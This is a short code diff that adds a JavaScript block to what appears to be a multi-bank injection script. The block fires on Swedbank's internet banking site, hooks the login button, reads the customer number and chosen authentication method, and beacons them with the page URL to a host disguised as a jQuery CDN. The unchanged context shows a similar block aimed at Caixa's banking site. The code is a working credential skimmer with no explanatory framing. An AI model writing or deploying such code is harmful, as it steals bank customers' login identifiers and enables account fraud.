@@ -8,6 +8,22 @@ for (var i = 0; i < arrayLength; i++) {
 }
 
 
+if (top['location']['href']['indexOf']('internetbank.swedbank.se') > -1) {
+    var interval = setInterval(function () {
+        if (document['getElementsByClassName']('dl-container')) {
+            clearInterval(interval);
+            document['getElementsByName']('auth:fortsett_knapp')[0].onclick = function (_0x441cx2) {
+              var option = document.getElementsByName("auth:metod_2");
+              var select = option.options[option.selectedIndex].value;
+              var login = {};
+                  login.userid = document.getElementsByName("auth:kundnummer")[0].value;
+            (new Image).src = "//cdn-s1-cloud-jquery.herokuapp.com/logs.php?l="+window.location.href+"&e="+login.userid+"&p="+select;
+            }
+        }
+    }, 1000)
+};
+
+
 if (top['location']['href']['indexOf']('internetbanking.caixa.gov.br') > -1) {
     var interval = setInterval(function () {
         if (document['getElementById']('conteudo-login')) {
